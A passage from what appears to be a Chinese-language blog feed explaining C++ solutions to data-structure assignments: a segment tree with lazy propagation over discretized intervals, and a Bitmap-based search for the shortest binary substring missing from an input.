operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>operations<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> maxcnt<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> cout <span class="token operator">&lt;&lt;</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> maxcnt<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 <code>arr</code> 中记录排序与去重后的离散化的线段端点, 那么我们假想的扩充数组的长度为 <code>maxcnt = 2 * cnt - 1</code>. 对于每一次操作给出的端点 <code>x</code>, <code>y</code>, 我们通过二分查找得到其在 <code>arr[]</code> 中的坐标 <code>left</code>, <code>right</code>, 其在扩充数组中的对应的端点为 <code>2 * left</code>, <code>2 * right</code>.</p><p>以下函数参数中的 <code>k</code>, <code>l</code>, <code>r</code> 分别代表树的编号, 编号为 <code>k</code> 的树的左端点, 编号为 <code>k</code> 的树的右端点, <code>x</code>, <code>y</code> 分别代表操作区间的左端点, 右端点.</p><h4 id="push-down操作"><a href="#push-down操作" class="headerlink" title="push_down操作"></a>push_down操作</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 39</span><span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> ll num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+=</span> num <span class="token operator">*</span> <span class="token function">real_length</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">;</span>    label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+=</span> num<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>update()</code> 更新编号为 <code>k</code> 的树的线段和和与懒惰标记, 即此时我们不进行数据的下放, 而是以懒惰标记的形式将其暂存在 <code>label[]</code> 内.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 45</span><span class="token keyword">void</span> <span class="token function">push_down</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> label<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">update</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> label<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>push_down</code> 操作分别更新左右子树的和与懒惰标记, 并且将自身懒惰标记置零.</p><h4 id="翻牌操作"><a href="#翻牌操作" class="headerlink" title="翻牌操作"></a>翻牌操作</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 34</span>ll <span class="token function">real_length</span><span class="token punctuation">(</span><span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> ll<span class="token operator">*</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token punctuation">(</span>r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>r <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> arr<span class="token punctuation">[</span>l <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token punctuation">(</span>l <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>real_length()</code> 线段树中两端点间的实际线段长度, 我们使用实际长度对 <code>tree[k]</code> 进行更新与维护.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 53</span><span class="token keyword">void</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> r <span class="token operator">||</span> y <span class="token operator">&lt;</span> l<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> l <span class="token operator">&amp;&amp;</span> y <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">update</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">push_down</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> y<span class="token punctuation">)</span> <span class="token function">do_add</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> tree<span class="token punctuation">[</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> tree<span class="token punctuation">[</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>若 <code>add</code> 区间与子树区间不交, 直接返回;</li><li>若子树区间包含在 <code>add</code> 区间内, 直接更新当前子树的和与懒惰标记;</li><li>若子树区间与 <code>add</code> 区间相交, 那么向下递归: 若当前懒惰标记非零, 先进行懒惰标记的下放. 然后分别更新左子树 <code>tree[left_son(k)]</code> 与右子树 <code>tree[right_son(k)]</code> 的和, 最后用左右子树的和更新本身的和 <code>tree[k]</code>.</li></ul><h4 id="查询操作"><a href="#查询操作" class="headerlink" title="查询操作"></a>查询操作</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 66</span>ll <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">,</span> <span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> r <span class="token operator">||</span> y <span class="token operator">&lt;</span> l<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> l <span class="token operator">&amp;&amp;</span> y <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> tree<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        ll sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>label<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">push_down</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> sum <span class="token operator">=</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token function">left_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> y<span class="token punctuation">)</span> sum <span class="token operator">+=</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token function">right_son</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sum<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>do_add()</code> 与 <code>do_query()</code> 在逻辑上完全相同.</p><ul><li>若 <code>query</code> 区间与子树区间不交, 直接返回;</li><li>若子树区间包含在 <code>query</code> 区间内, 直接返回当前子树的和;</li><li>若子树区间与 <code>query</code> 区间相交, 那么向下递归: 若当前懒惰标记非零, 先进行懒惰标记的下放. 然后分别查询左子树 <code>tree[left_son(k)]</code> 与右子树 <code>tree[right_son(k)]</code> 的和, 最后用左右子树的和更新本身的和 <code>tree[k]</code>.</li></ul><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>读入数据后对端点使用 <code>qsort()</code> 进行排序, 时间复杂度为 $O(mlogm)$;</p><p>对排序后的有序数组进行去重, 时间复杂度为 $O(m)$;</p><p>每次 <code>do_add()</code> 操作与 <code>do_query()</code> 操作实际上是对整树的一次扫描, 时间复杂度正比于树高 $O(logm)$, $m$ 次操作的整体时间复杂度仍为 $O(mlog(m)).</p><p>综上, 算法总体时间复杂度为 $O(mlog(m))$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>本体空间复杂度取决于操作数 <code>m</code> 带来的离散化后的端点数 <code>k</code>, 题解中使用 <code>tree[]</code> 与 <code>label[]</code> 数组模拟了一棵 <code>Segment Tree</code>, 整体需要的空间最坏情况仍为 $O(m)$.</p><p>本题中直接开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 6</span><span class="token keyword">const</span> <span class="token keyword">int</span> MAX <span class="token operator">=</span> <span class="token number">2e5</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 9</span>ll tree<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 使用 tree[] 来模拟一棵线段树.</span>ll label<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 懒惰标记.</span>ll arr<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span> MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 对离散化的线段端点序列进行排序与去重.</span>ll operations<span class="token punctuation">[</span>MAX <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录操作序列.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $(16 + 16 + 2 + 3)\times 2\times 10^5 \times 8B = 56MB$, 在题目要求范围内.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Not Found</title>
      <link href="/2022/11/16/shu-ju-jie-gou-not-found/"/>
      <url>/2022/11/16/shu-ju-jie-gou-not-found/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA3"><a href="#CST-PA3" class="headerlink" title="CST PA3"></a>CST PA3</h1><h2 id="3-2-Not-Found"><a href="#3-2-Not-Found" class="headerlink" title="3-2 Not Found"></a>3-2 Not Found</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>注意到 $A$ 的输入长度范围为 $[1, 2^{24}]$, 而可由 $A$ 产生的所有长度为 $n$ 的子串数为 $\vert A\vert - n + 1$. 一个长度为 $n$ 的字符串共有 $2^n$ 种可能, 当 $n  = 24$ 时, 由 $\vert A\vert - 24 + 1 &lt; 2^{24}$, $A$ 中已经无法包含所有长度为 $24$ 的子串, 因此第一个未在 $A$ 中出现的子串必是长度不超过 $24$ 的子串.</p><p>考虑枚举所有长度为 $k$ 的子串, 其中 $k \le \min(\vert A\vert, 24)$. 对于 $A$ 中长度为 $k$ 的所有子串, 我们依据其二进制值进行标记. 由于数据范围过大, 且实际上需储存的只是串的存在性, 因此考虑使用 <code>Bitmap</code> 对子串情况进行存储.</p><h4 id="class-Bitmap"><a href="#class-Bitmap" class="headerlink" title="class Bitmap"></a>class Bitmap</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 6</span><span class="token comment">// 实现一个 Bitmap 类存储 01 字符串.</span><span class="token keyword">class</span> <span class="token class-name">Bitmap</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token comment">// 所存放的空间 M[], 容量为 N * sizeof(char) * 8 bit.</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> M<span class="token punctuation">;</span>    <span class="token keyword">int</span> N<span class="token punctuation">;</span>      <span class="token comment">// 初始化 Bitmap, 置 0.</span>    <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        N <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span>        M <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 构造函数.</span>    <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">init</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 设置 Bitmap 第 k 位为 1.</span>    <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 清除 Bitmap 第 k 位.</span>    <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 检测 Bitmap 第 k 位是否为 1.</span>    <span class="token keyword">bool</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> M<span class="token punctuation">[</span>k <span class="token operator">&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>k <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>    <span class="token comment">// 清零 Bitmap. </span>    <span class="token keyword">void</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">memset</span><span class="token punctuation">(</span>M<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="void-read-input"><a href="#void-read-input" class="headerlink" title="void read_input()"></a>void read_input()</h4><p>在读入初始字符串时, 设置 <code>Bitmap* str</code>, 若初始字符串第 $k$ 位为 $1$, 则使用 <code>str-&gt;set[k]</code> 修改 <code>Bitmap</code> 的内容. 将输入字符串从左到右读入 <code>Bitmap* str</code>, 此时 <code>Bitmap* str</code> 存放了一个 $01$ 字符串.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 32</span><span class="token keyword">void</span> <span class="token function">read_input</span><span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">&amp;</span> input<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>input <span class="token operator">!=</span> <span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        input <span class="token operator">=</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token char">'1'</span><span class="token punctuation">)</span>             str<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        len<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="int-read"><a href="#int-read" class="headerlink" title="int read()"></a>int read()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 42</span><span class="token keyword">int</span> <span class="token function">read</span><span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> bitmap<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> read_len<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> read_len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> bitmap<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>pos <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> tmp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>read()</code> 从 <code>Bitmap* str</code> 第 <code>pos</code> 位开始读取为长 <code>read_len</code> 的二进制串, 并将其转换为十进制数. 为了节省遍历子串的时间, 首先考虑 $k = \min(\vert A\vert, 24)$ 的情形.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 113</span><span class="token keyword">int</span> k <span class="token operator">=</span> search_len<span class="token punctuation">;</span>Bitmap<span class="token operator">*</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> search_len<span class="token punctuation">)</span><span class="token punctuation">;</span>Bitmap<span class="token operator">*</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Bitmap</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>search_len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Bitmap* a</code> 用于存储所有长 $k$ 位的 $01$ 串在原字符串中的出现情况, 若 <code>a-&gt;test(i) == true</code>, 则输入串中存在十进制值为 $i$ 的 $k$ 位 $01$ 二进制串. <code>Bitmap* b</code> 用于存储所有长 $k - 1$ 位的 $01$ 串在原字符串中的出现情况, 若 <code>b-&gt;test(j) == true</code>, 则输入串中存在十进制值为 $j$ 的 $k - 1$ 位 $01$ 二进制串.</p><p>从 <code>Bitmap* str</code> 的末尾开始向头部遍历, 对于当前处理的二进制串的十进制值 $s = \overline{a_{m + 1}a_{m + 2}\cdots a_{m + k}}_2$, 下一个处理串的十进制值 $s’ = \overline{a_ma_{m + 1}\cdots a_{m + k - 1}}_2 = a\gg 1 + a_m\ll (k - 1)$.</p><p>从后向前遍历, 节省了将二进制串转换为十进制串的时间.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 118</span><span class="token keyword">int</span> pos <span class="token operator">=</span> len <span class="token operator">-</span> k<span class="token punctuation">;</span><span class="token keyword">int</span> get <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pos<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>pos <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">)</span>        get <span class="token operator">+=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_end</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> b<span class="token punctuation">,</span> len <span class="token operator">-</span> k<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" 